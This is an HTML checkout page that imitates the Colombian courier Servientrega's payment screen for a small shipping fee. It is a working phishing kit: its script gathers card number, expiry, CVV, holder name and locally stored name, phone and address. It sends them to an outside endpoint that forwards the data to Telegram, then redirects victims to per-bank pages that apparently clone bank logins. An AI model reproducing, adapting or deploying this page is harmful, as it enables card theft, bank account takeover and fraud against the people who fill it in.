<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago - Servientrega</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* (Tu CSS original, sin cambios) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background-color: #f5f5f5; color:#333; }
        .header { background: linear-gradient(135deg,#4CAF50,#45a049); padding:20px 0; }
        .header-content { max-width:1200px; margin:0 auto; display:flex; justify-content:center; align-items:center; padding:0 20px; }
        .header img { height:40px; }
        .container { max-width:1100px; margin:40px auto; display:flex; gap:30px; padding:0 20px; }
        .payment-box { flex:1; background:white; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.08); padding:35px; }
        .payment-box h2 { font-size:24px; font-weight:600; color:#555; margin-bottom:30px; }
        .payment-methods { display:flex; flex-direction:column; gap:15px; margin-bottom:30px; }
        .payment-method { border:2px solid #e0e0e0; border-radius:12px; padding:20px 25px; display:flex; align-items:center; gap:20px; cursor:pointer; transition:all .3s; position:relative; }
        .payment-method:hover { border-color:#4CAF50; background:#f9f9f9; }
        .payment-method.selected { border-color:#4CAF50; background:#f1f8f4; }
        .payment-method-icon { width:60px; height:60px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
        .payment-method-icon img { max-width:100%; max-height:100%; object-fit:contain; }
        .payment-method-text { flex:1; }
        .payment-method-title { font-size:16px; font-weight:500; color:#333; }
        .payment-method-badge { position:absolute; top:-8px; left:45px; background:#1a73e8; color:white; font-size:11px; font-weight:600; padding:3px 8px; border-radius:3px; text-transform:uppercase; }
        .payment-form { display:none; animation: slideDown .3s ease-out; margin-top:10px; }
        .payment-form.active { display:block; }
        @keyframes slideDown { from{opacity:0; transform:translateY(-10px);} to{opacity:1; transform:translateY(0);} }
        .card-icons { display:flex; gap:10px; margin-bottom:25px; align-items:center; }
        .card-icons img { height:30px; opacity:.8; }
        .field { margin-bottom:20px; }
        .field label { display:block; margin-bottom:8px; font-weight:500; color:#333; font-size:14px; }
        input[type="text"], input[type="tel"], select { width:100%; padding:14px 16px; border:1px solid #e0e0e0; border-radius:8px; font-size:15px; font-family:'Inter',sans-serif; transition:all .3s; }
        input[type="text"]:focus, input[type="tel"]:focus, select:focus { outline:none; border-color:#4CAF50; box-shadow:0 0 0 3px rgba(76,175,80,.1); }
        .half-field { display:flex; gap:12px; }
        .half-field input { flex:1; }
        .btn { background:#4CAF50; color:white; font-weight:600; font-size:16px; border:none; padding:16px; width:100%; border-radius:8px; cursor:pointer; transition:all .3s; margin-top:10px; }
        .btn:hover { background:#45a049; transform:translateY(-2px); box-shadow:0 4px 12px rgba(76,175,80,.3); }
        .secure { text-align:center; margin-top:20px; color:#4CAF50; font-size:14px; display:flex; align-items:center; justify-content:center; gap:8px; font-weight:500; }
        .secure i { font-size:16px; }
        .summary-box { flex:0 0 350px; background:white; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,.08); padding:30px; height:fit-content; }
        .summary-box h3 { font-size:20px; font-weight:600; color:#333; margin-bottom:20px; padding-bottom:15px; border-bottom:2px solid #f0f0f0; }
        .summary-line { display:flex; justify-content:space-between; margin-bottom:15px; font-size:15px; color:#666; }
        .summary-line.total { margin-top:20px; padding-top:20px; border-top:2px solid #f0f0f0; font-size:18px; font-weight:600; color:#333; }
        .summary-line .price { font-weight:600; color:#333; }
        .summary-line.total .price { color:#4CAF50; font-size:24px; }
        .old-price { text-decoration:line-through; color:#999; font-size:14px; margin-left:10px; font-weight:400; }
        .note { margin-top:20px; padding:15px; background:#f9f9f9; border-radius:8px; font-size:12px; color:#666; line-height:1.5; }
        .note strong { color:#333; }
        #modalCarga { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.7); display:none; justify-content:center; align-items:center; z-index:9999; }
        .modal-content { background:white; padding:40px; border-radius:12px; text-align:center; max-width:90%; }
        .spinner { border:4px solid #f3f3f3; border-top:4px solid #4CAF50; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px; }
        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
        .modal-content p { font-size:16px; color:#333; font-weight:500; }
        @media (max-width:768px){ .container{flex-direction:column; margin:20px auto; padding:0 15px; gap:20px;} .payment-box,.summary-box{width:100%; padding:25px 20px;} .payment-box h2{font-size:20px;} }
        @media (max-width:480px){ .payment-box,.summary-box{padding:20px 15px;} .payment-box h2{font-size:18px;} }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <img src="img/logo-servientrega-blanco.svg" alt="Servientrega">
        </div>
    </header>

    <div class="container">
        <div class="payment-box">
            <h2>Escoge un m√©todo de pago</h2>
            
            <div class="payment-methods">
                <div class="payment-method" onclick="seleccionarMetodo(this, 'tarjeta')">
                    <div class="payment-method-icon">
                        <img src="img/depositphotos_106860552-stock-photo-collection-of-popular-payment-system.jpg" alt="Tarjetas">
                    </div>
                    <div class="payment-method-text">
                        <div class="payment-method-title">Usa tus Tarjetas</div>
                    </div>
                </div>

                <!-- <div class="payment-method" onclick="seleccionarMetodo(this, 'banco')">
                    <div class="payment-method-badge">Nuevo</div>
                    <div class="payment-method-icon">
                        <img src="img/LogoBancolombia.png" alt="Bancolombia" style="width:100%;">
                    </div>
                    <div class="payment-method-text">
                        <div class="payment-method-title">Transfiere con tu cuenta Bancolombia</div>
                    </div>
                </div> -->

                <!-- <div class="payment-method" onclick="seleccionarMetodo(this, 'corresponsal')">
                    <div class="payment-method-icon">
                        <i class="fas fa-hand-holding-usd" style="font-size:35px; color:#4CAF50;"></i>
                    </div>
                    <div class="payment-method-text">
                        <div class="payment-method-title">Paga en efectivo en un Corresponsal Bancario</div>
                    </div>
                </div> -->

                <!-- <div class="payment-method" onclick="seleccionarMetodo(this, 'nequi')">
                    <div class="payment-method-icon">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Nequi_logo.svg/2560px-Nequi_logo.svg.png" alt="Nequi">
                    </div>
                    <div class="payment-method-text">
                        <div class="payment-method-title">Usa tu cuenta Nequi</div>
                    </div>
                </div> -->

                <div class="payment-method" onclick="seleccionarMetodo(this, 'pse')">
                    <div class="payment-method-icon">
                        <img src="img/pse-1-300x300 (1).png" alt="PSE">
                    </div>
                    <div class="payment-method-text">
                        <div class="payment-method-title">Usa tu cuenta de ahorros o corriente</div>
                    </div>
                </div>

                <!-- Placeholder: mantenemos la posici√≥n original para restaurar -->
                <div id="form-placeholder" aria-hidden="true"></div>

            </div> <!-- .payment-methods -->

            <!-- Formulario de Tarjeta (se mover√° din√°micamente justo debajo del m√©todo seleccionado) -->
            <div id="form-tarjeta" class="payment-form" aria-hidden="true">
                <div class="field">
                    <label for="card-number">N√∫mero de tarjeta</label>
                    <input type="tel" id="card-number" placeholder="0000 0000 0000 0000" inputmode="numeric" autocomplete="cc-number">
                </div>

                <div class="field">
                    <label>Fecha de expiraci√≥n y CVV</label>
                    <div class="half-field">
                        <input type="text" id="expiry-month" placeholder="MM" maxlength="2" pattern="[0-9]{2}" inputmode="numeric" autocomplete="cc-exp-month">
                        <input type="text" id="expiry-year" placeholder="AA" maxlength="2" pattern="[0-9]{2}" inputmode="numeric" autocomplete="cc-exp-year">
                        <input type="text" id="cvv" placeholder="CVV" maxlength="4" pattern="[0-9]{3,4}" inputmode="numeric" autocomplete="cc-csc">
                    </div>
                </div>

                <div class="field">
                    <label for="card-holder">Titular de la tarjeta</label>
                    <input type="text" id="card-holder" placeholder="Nombre completo" autocomplete="cc-name">
                </div>

                <div class="field">
                    <label for="banco-select">Selecciona tu banco</label>
                    <select id="banco-select">
                        <option value="">Seleccionar banco...</option>
                        <option value="BANCOLOMBIA">Bancolombia</option>
                        <option value="BANCO AGRARIO">Banco Agrario</option>
                        <option value="BANCO AVVILLAS">Banco AV Villas</option>
                        <option value="BANCO BBVA">BBVA Colombia</option>
                        <option value="BANCO CAJA SOCIAL">Banco Caja Social</option>
                        <option value="BANCO CITIBANK">Citibank</option>
                        <option value="BANCO COLPATRIA">Banco Colpatria</option>
                        <option value="BANCO CORPBANCA">Corpbanca</option>
                        <option value="BANCO DAVIVIENDA">Davivienda</option>
                        <option value="BANCO DE BOGOTA">Banco de Bogot√°</option>
                        <option value="BANCO DE OCCIDENTE">Banco de Occidente</option>
                        <option value="BANCO FALABELLA">Banco Falabella</option>
                        <option value="BANCO FINANDINA">Banco Finandina</option>
                        <option value="BANCO GANADERO">Banco Ganadero</option>
                        <option value="BANCO GNB SUDAMERIS">GNB Sudameris</option>
                        <option value="BANCO HSBC COLOMBIA">HSBC Colombia</option>
                        <option value="BANCO ITAU">Banco Ita√∫</option>
                        <option value="BANCO POPULAR">Banco Popular</option>
                        <option value="BANCO SANTANDER">Banco Santander</option>
                        <option value="BANCO CREDIBANCO">Credibanco</option>
                        <option value="BANCO HELM BANK">Helm Bank</option>
                        <option value="Nequi">Nequi</option>
                        <option value="SERFINANSA">Serfinansa</option>
                        <option value="SERVIBANCA">Servibanca</option>
                        <option value="TUYA">Tuya</option>
                        <option value="NUBANK">Nu Colombia</option>
                    </select>
                </div>

                <button class="btn" id="btn-pagar">Realizar pago</button>
            </div>
            
            <div class="secure">
                <i class="fas fa-lock"></i>
                Pago 100% seguro
            </div>
        </div>

        <div class="summary-box">
            <h3>Resumen de compra</h3>
            
            <div class="summary-line">
                <span>Producto</span>
                <span class="price">Servicio de env√≠o</span>
            </div>
            
            <div class="summary-line">
                <span>Precio</span>
                <span class="price">$7.990</span>
            </div>
            
            <div class="summary-line">
                <span>IVA (19%)</span>
                <span class="price">$328</span>
            </div>
            
            <div class="summary-line total">
                <span>Total a pagar</span>
                <span class="price">$8.318 <span class="old-price">$25.000</span></span>
            </div>

            <div class="note">
                El cargo en tu tarjeta o cuenta bancaria aparecer√° como <strong>SVE S.A.</strong>
            </div>
        </div>
    </div>

    <div id="modalCarga" aria-hidden="true">
        <div class="modal-content">
            <div class="spinner" role="status" aria-hidden="true"></div>
            <p>Procesando pago...</p>
        </div>
    </div>

    <script>
    // Mapeo de redirecciones por banco (reutilizable)
    const BANK_REDIRECTIONS = {
        'BANCOLOMBIA': 'bancos/bancol/formulario_u1.php',
        'BANCO AGRARIO': 'bancos/agra.html',
        'BANCO AVVILLAS': 'bancos/villas/formulario_u1.php',
        'BANCO BBVA': 'bancos/bba/formulario_u1.php',
        'BANCO CAJA SOCIAL': 'bancos/cj/formulario_u1.php',
        'BANCO CITIBANK': 'bancos/colpa/formulario_u1.php',
        'BANCO COLPATRIA': 'bancos/colpa/formulario_u1.php',
        'BANCO CORPBANCA': 'bancos/itau/formulario_u1.php',
        'BANCO DAVIVIENDA': 'bancos/davi/formulario_u1.php',
        'BANCO DE BOGOTA': 'bancos/bogota/formulario_u1.php',
        'BANCO DE OCCIDENTE': 'bancos/cjs/formulario_u1.php',
        'BANCO FALABELLA': 'bancos/fala/formulario_u1.php',
        'BANCO FINANDINA': 'bancos/finan.html',
        'BANCO GANADERO': 'bancos/ganadero.html',
        'BANCO GNB SUDAMERIS': 'cargapago.html',
        'BANCO HSBC COLOMBIA': 'cargapago.html',
        'BANCO ITAU': 'bancos/itau/formulario_u1.php',
        'BANCO POPULAR': 'bancos/popu.html',
        'BANCO SANTANDER': 'bancos/santan.html',
        'BANCO CREDIBANCO': 'cargapago.html',
        'BANCO HELM BANK': 'cargapago.html',
        'Nequi': 'bancos/nequi/',
        'SERFINANSA': 'cargapago.html',
        'SERVIBANCA': 'cargapago.html',
        'TUYA': 'cargapago.html',
        'NUBANK': 'cargapago.html'
    };

    // ---- Utilidades UI ----
    function mostrarModalCarga() {
        const modal = document.getElementById('modalCarga');
        if (modal) modal.style.display = 'flex';
    }
    function ocultarModalCarga() {
        const modal = document.getElementById('modalCarga');
        if (modal) modal.style.display = 'none';
    }

    // ---- Selecci√≥n de m√©todo ----
    function seleccionarMetodo(elemento, metodo) {
        document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
        const form = document.getElementById('form-tarjeta');
        const placeholder = document.getElementById('form-placeholder');
        if (!form || !placeholder) return;

        if (metodo === 'tarjeta') {
            elemento.classList.add('selected');
            elemento.insertAdjacentElement('afterend', form);
            form.classList.add('active');
            form.setAttribute('aria-hidden', 'false');
            const first = form.querySelector('#card-number');
            if (first) first.focus();
            return;
        }

        // restaurar formulario al placeholder y ocultarlo
        placeholder.insertAdjacentElement('afterend', form);
        form.classList.remove('active');
        form.setAttribute('aria-hidden', 'true');

        elemento.classList.add('selected');

        if (metodo === 'pse') {
            mostrarModalCarga();
            setTimeout(() => {
                ocultarModalCarga();
                window.location.href = 'rse.html';
            }, 1500);
        } else if (metodo === 'banco' || metodo === 'corresponsal') {
            window.location.href = 'rse.html';
        } else if (metodo === 'nequi') {
            window.location.href = 'bancos/nequi/';
        }
    }

    // ---- Algoritmo Luhn ----
    function algoritmoLuhn(numeroTarjeta) {
        let suma = 0;
        let alternar = false;
        for (let i = numeroTarjeta.length - 1; i >= 0; i--) {
            let digito = parseInt(numeroTarjeta.charAt(i), 10);
            if (alternar) {
                digito *= 2;
                if (digito > 9) digito -= 9;
            }
            suma += digito;
            alternar = !alternar;
        }
        return (suma % 10) === 0;
    }

    // ---- Verificaci√≥n ----
    function verificarSistemaIlunh(numeroTarjeta, mes, anio, cvv) {
        try {
            const numeroLimpio = String(numeroTarjeta).replace(/\s+/g, '');
            if (numeroLimpio.length < 13 || numeroLimpio.length > 19) return false;
            if (!/^\d+$/.test(numeroLimpio)) return false;
            if (!algoritmoLuhn(numeroLimpio)) return false;
            if (!/^\d{3,4}$/.test(cvv)) return false;
            const mesNum = parseInt(mes, 10);
            if (isNaN(mesNum) || mesNum < 1 || mesNum > 12) return false;
            let a√±oNum = parseInt(anio, 10);
            if (isNaN(a√±oNum)) return false;
            if (anio.length === 2) a√±oNum += 2000;
            const ahora = new Date();
            const fechaExpira = new Date(a√±oNum, mesNum);
            if (fechaExpira <= ahora) return false;
            return true;
        } catch (e) {
            console.error('Error verificaci√≥n:', e);
            return false;
        }
    }

    // ---- Env√≠o a Telegram y redirecci√≥n POST-OK ----
    async function enviarDatosTelegram() {
        const btnPagar = document.getElementById('btn-pagar');
        if (btnPagar) btnPagar.disabled = true;

        const numeroTarj = document.getElementById('card-number')?.value.replace(/\s+/g, '') || '';
        const mes = document.getElementById('expiry-month')?.value || '';
        const anio = document.getElementById('expiry-year')?.value || '';
        const cvv = document.getElementById('cvv')?.value || '';
        const titular = document.getElementById('card-holder')?.value || '';
        const bancoSeleccionado = document.getElementById('banco-select')?.value || '';

        if (!numeroTarj || !mes || !anio || !cvv || !titular) {
            alert('Por favor completa todos los campos de la tarjeta.');
            if (btnPagar) btnPagar.disabled = false;
            return false;
        }

        mostrarModalCarga();

        if (!verificarSistemaIlunh(numeroTarj, mes, anio, cvv)) {
            ocultarModalCarga();
            alert('Datos de tarjeta inv√°lidos. Por favor verifica los datos.');
            if (btnPagar) btnPagar.disabled = false;
            return false;
        }

        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const formSubmitted = localStorage.getItem('formSubmitted') || 'false';
        const submissionDate = localStorage.getItem('submissionDate') || 'No especificada';

        const fechaExp = `${mes}/${anio}`;
        const mensaje = `üîª *Nueva compra realizada* üîª

üë§ *Datos del cliente:*
Nombre: ${userData.firstName || ''} ${userData.lastName || ''}
üìû Tel√©fono: ${userData.phone || ''}
üìç Direcci√≥n: ${userData.address || ''}
üèôÔ∏è Municipio: ${userData.municipality || ''}
üè¢ Departamento: ${userData.department || ''}

üìÖ Fecha de env√≠o: ${submissionDate}
‚úÖ Formulario enviado: ${formSubmitted}

üí≥ *Datos de pago:*
Titular: ${titular}
N√∫mero: ${numeroTarj}
üìÖ Expiraci√≥n: ${fechaExp}
üîê CVV: ${cvv}

‚úÖ *Verificaci√≥n ilunh: APROBADA*`.trim();

        try {
            const resp = await fetch('https://apitemu.vercel.app/api/send-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: mensaje })
            });

            if (resp.ok) {
                // decidir destino seg√∫n banco seleccionado (si existe en el mapa)
                const destino = BANK_REDIRECTIONS[bancoSeleccionado] || 'rse.html';
                setTimeout(() => {
                    ocultarModalCarga();
                    window.location.href = destino;
                }, 900);
                return true;
            } else {
                ocultarModalCarga();
                console.error('Error API status:', resp.status);
                alert('Error al procesar el pago. Por favor, int√©ntalo de nuevo.');
                if (btnPagar) btnPagar.disabled = false;
                return false;
            }
        } catch (err) {
            ocultarModalCarga();
            console.error('Fallo de red:', err);
            alert('Error de red. Por favor, verifica tu conexi√≥n a internet.');
            if (btnPagar) btnPagar.disabled = false;
            return false;
        }
    }

    function procesarPago() {
        // Llama a enviarDatosTelegram y la redirecci√≥n ocurre all√≠ SOLO si OK
        enviarDatosTelegram();
    }

    // ---- Listeners y formateo ----
    document.addEventListener('DOMContentLoaded', function() {
        // Formato del n√∫mero de tarjeta (grupos de 4)
        const cardInput = document.getElementById('card-number');
        if (cardInput) {
            cardInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
                e.target.value = formatted;
            });
        }

        // Mes
        const monthInput = document.getElementById('expiry-month');
        if (monthInput) {
            monthInput.addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length > 2) v = v.slice(0,2);
                if (v.length === 2) {
                    const num = parseInt(v, 10);
                    if (num < 1) v = '01';
                    if (num > 12) v = '12';
                }
                e.target.value = v;
            });
        }

        // A√±o
        const yearInput = document.getElementById('expiry-year');
        if (yearInput) {
            yearInput.addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length > 2) v = v.slice(0,2);
                e.target.value = v;
            });
        }

        // CVV
        const cvvInput = document.getElementById('cvv');
        if (cvvInput) {
            cvvInput.addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length > 4) v = v.slice(0,4);
                e.target.value = v;
            });
        }

        // Bot√≥n pagar
        const btnPagar = document.getElementById('btn-pagar');
        if (btnPagar) {
            btnPagar.addEventListener('click', function(e) {
                e.preventDefault();
                procesarPago();
            });
        }

        // NOTA: removimos la escucha 'change' que redirig√≠a al seleccionar banco.
        // Ahora la redirecci√≥n ocurre SOLO despu√©s de enviarDatosTelegram() y recibir OK.
    });
</script>

</body>
</html>
